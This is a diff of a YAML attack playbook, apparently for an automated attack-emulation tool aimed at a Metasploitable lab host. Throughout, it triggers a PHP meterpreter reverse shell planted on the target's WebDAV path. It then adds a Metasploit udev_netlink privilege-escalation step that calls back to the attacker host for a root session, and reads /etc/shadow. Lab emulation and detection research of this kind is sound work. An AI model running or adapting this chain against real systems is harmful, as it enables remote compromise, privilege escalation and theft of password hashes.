@@ -17,7 +17,7 @@ vars:
   METASPLOITABLE: 172.17.0.106
   ATTACKER: 172.17.0.127
   PAYLOAD: php/meterpreter/reverse_tcp
-  LPORT: 4444
+  LPORT: 4410
 
 commands:
   - type: mktemp
@@ -49,16 +49,16 @@ commands:
     url: http://$METASPLOITABLE/dav/shell.php
     local_path: ${RSHELL}.php
 
+  # wait two seconds
+  - type: sleep
+    seconds: 2
+
   # execute shell via http-get in background
   - type: http-client
     cmd: GET
     url: http://$METASPLOITABLE/dav/shell.php
     background: true
     kill_on_exit: true
-
-  # wait two seconds
-  - type: sleep
-    seconds: 2
 
   # execute command in reverse-shell
   - type: msf-session
@@ -69,3 +69,23 @@ commands:
   - type: msf-session
     cmd: sysinfo
     session: shell
+
+  - type: debug
+    varstore: True
+
+  - type: msf-module
+    cmd: exploit/linux/local/udev_netlink
+    creates_session: root
+    payload: linux/x86/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: 4448
+    session: shell
+
+  - type: msf-session
+    cmd: getuid
+    session: root
+
+  - type: msf-session
+    cmd: cat /etc/shadow
+    session: root
